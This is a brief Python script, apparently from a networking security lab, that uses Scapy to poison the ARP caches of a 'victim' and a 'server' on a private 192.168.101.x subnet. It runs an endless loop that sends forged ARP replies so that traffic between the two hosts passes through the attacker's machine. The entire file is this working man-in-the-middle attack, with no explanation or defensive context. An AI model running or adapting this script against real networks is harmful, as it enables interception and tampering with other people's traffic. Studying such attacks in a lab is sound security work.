from scapy.all import *
import time

VICTIM_IP = "192.168.101.10"
SERVER_IP = "192.168.101.30"
ATTACKER_IP = "192.168.101.20"

ATTACKER_MAC = "02:42:c0:a8:65:14"
VICTIM_MAC = "02:42:c0:a8:65:0a"
SERVER_MAC = "02:42:c0:a8:65:1e"

def spoof(spoof_ip, dst_mac):
    broadcast = Ether(src=ATTACKER_MAC, dst=dst_mac)
    arp = ARP(op=2, hwdst=dst_mac, psrc=spoof_ip)
    sendp(broadcast / arp, verbose= False)

while True:
    print("Sending malicious ARP packets")
    spoof(VICTIM_IP, SERVER_MAC)
    spoof(SERVER_IP, VICTIM_MAC)
    time.sleep(1)



